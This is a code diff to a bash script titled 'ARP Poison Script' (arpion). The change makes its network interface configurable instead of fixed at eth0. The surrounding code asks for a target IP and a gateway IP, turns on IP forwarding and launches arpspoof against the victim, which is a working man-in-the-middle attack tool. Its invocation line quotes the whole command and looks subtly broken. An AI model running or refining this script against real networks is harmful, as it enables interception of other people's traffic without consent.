@@ -34,8 +34,6 @@ ver=$(echo arpion_1.0)
 #Author Johan "Saint" B�rjesson
 
 #################################Start script and validation####################################
-
-niccard=eth0
 if [[ $EUID -ne 0 ]]; then
 echo -e "${RED_TEXT}Script must be run as root!${END}"
 exit 1
@@ -45,6 +43,16 @@ echo -e "${RED_TEXT}########${END}${BLUE} ARP Poison Script${END}${RED_TEXT} ###
 echo -e "${RED_TEXT}#######################################${END}"
 echo -e "${BLUE}Author: Webbhatt${END}"
 echo -e "${BLUE}Website:http://www.webbhatt.com${END}"
+echo "What interface? (default: eth0)"
+read -r -p "Do you want to change interface? (Default: eth0) [y/N] " response
+case $response in
+[yY][eE][sS]|[yY])
+	read iface
+;;
+    *)
+	iface=eth0
+;;
+esac
 echo -n "Please enter target's IP: "
 read victimIP
 echo -n "Please enter Gateway's IP: "
@@ -55,7 +63,7 @@ echo -e "${RED_TEXT}Gateway:${END} $gatewayIP"
 echo -e "${BLUE}[*] Enabling IP Forwarding ${END}"
 echo "1" > /proc/sys/net/ipv4/ip_forward
 echo -e "${BLUE}[*] Starting ARP Poisoning between $victimIP and $gatewayIP!${END}"
-bash "arpspoof -i $niccard -t $victimIP $gatewayIP" &
+bash "arpspoof -i $iface -t $victimIP $gatewayIP" &
 fi
 
 
